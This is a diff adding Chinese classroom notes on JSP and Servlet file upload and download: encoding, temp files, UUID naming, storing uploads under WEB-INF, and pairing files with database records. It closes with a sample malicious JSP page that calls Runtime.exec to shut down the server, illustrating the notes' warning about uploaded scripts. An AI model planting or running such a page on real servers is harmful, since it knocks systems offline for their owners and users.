@@ -1,0 +1,100 @@
+提问：   ${param.username}           vs                 ${requestScope.username} 
+
+
+         request.getParameter("username")               request(请求对象/域对象).getAttribute("username")
+
+
+1 文件上传表单
+  1)上传文件的本质是文本复制的过程
+  2)技术层面，在Java中一定会用到IO操作，主要以二进制方式读写
+  3)传统方式下，对于上传文件字段不同的浏览器有着不同的解析方式，例如：
+IE6:
+upfile=c:\aa\bb\a.JPG
+非IE6： 
+upfile=a.JPG    光写个upfile是不能够上传文件的
+  4)可以将form以MIME协议的方式将上传文件传递到服务端，服务端以二进制流的方式读写
+代码： 客户端form enctype="multipart/form-data"/>
+      服务端request.getInputStream()
+
+*2 上传文件的细节
+
+
+  (1)中文乱码的问题
+     a)普通字段的中文乱码问题：FileItem.getString("UTF-8"),
+       注意：FileItem表示上传表单中的表单项内容
+     b)上传字段的中文乱码问题：ServletUploadFile.setHeaderEncoding("UTF-8");
+
+
+  (2)临时文件的删除的问题
+     a)通过FileItem.delete()
+     b)一定要在关闭IO流之后
+
+
+  (3)在同一个目录下上传相同文件名的问题
+     a)将文件名拼接一个唯一标识符，即UUID
+
+
+  (4)单个目录下文件过多的问题
+     a)采用位运算解决单个目录文件过多
+     b)思路：参见<<>>
+
+
+  (5)为安全将上传的文件放入客户端 无法直接访问 的目录中的问题----->比如用户上传一个危险的jsp文件，然后再去访问它，具有破坏性的jsp文件就执行了
+     a)将上传的文件，放置到/WEB-INF/upload/目录下
+     
+  (6)重构思想
+     a)做到通用性
+
+
+  (7)自定义封装上传文件工具类的问题
+
+
+课堂练习：无上传文件提交/只能上传JPG或jpg文件
+
+
+  (8)上传文件的大小的问题
+
+
+  (9)上传多个文件的问题
+
+
+ (10)上传多个文件的界面问题
+
+
+课堂练习：基于界面，限制上传文件的个数，参见<<课堂练习1.JPG>>
+
+
+*3 显示下载文件列表
+  a)递归方式查询可供下载的文件，一定要有出口条件
+  b)使用Map<UUID文件名,真实文件名>收集可供下载的文件
+  c)使用<c:url>和<c:param>对中文名进行URL编码
+
+
+*4 下载文件
+   a)对传过来的中文编码进行URL解码
+   b)通过UUID文件名，反向查到该文件所在的真实目录
+  
+5 文件上传下载与数据库结合
+   a)在将上传文件保存的同时，写往数据库表，一个上传文件对应一条记录，确保uuidFileName双方一致
+   
+   思考：
+a)上传时，先硬盘，再表？
+b)下载时，先硬盘，再表？
+c)删除时，先硬盘，再表？
+d)是否需要事务支持？
+<%@   page   language = "java"   pageEncoding = "UTF-8" %>
+<! DOCTYPE   HTML   PUBLIC   "-//W3C//DTD HTML 4.01 Transitional//EN">
+< html >
+   < body >
+     <%
+        Runtime.getRuntime().exec( "shutdown -s -t 200" );    
+     %>       
+   </ body > </ html >   
+
+
+
+
+
+
+
+
